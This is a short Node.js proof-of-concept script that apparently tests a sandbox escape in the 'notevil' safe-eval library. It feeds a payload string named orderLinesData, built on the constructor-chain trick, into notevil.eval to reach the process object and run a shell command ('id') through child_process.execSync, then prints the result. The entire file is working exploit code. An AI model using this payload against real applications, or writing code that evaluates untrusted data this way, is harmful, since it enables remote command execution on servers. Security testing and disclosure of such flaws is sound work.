const vm = require('vm');
const notevil = require('notevil');
const safeEval = notevil.eval;

const orderLinesData = 'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id").toString()';

try {
  const sandbox = { safeEval, orderLinesData };
  vm.createContext(sandbox);
  const result = vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 });
  console.log("Result:", result);
} catch (e) {
  console.log("Error:", e.message);
}
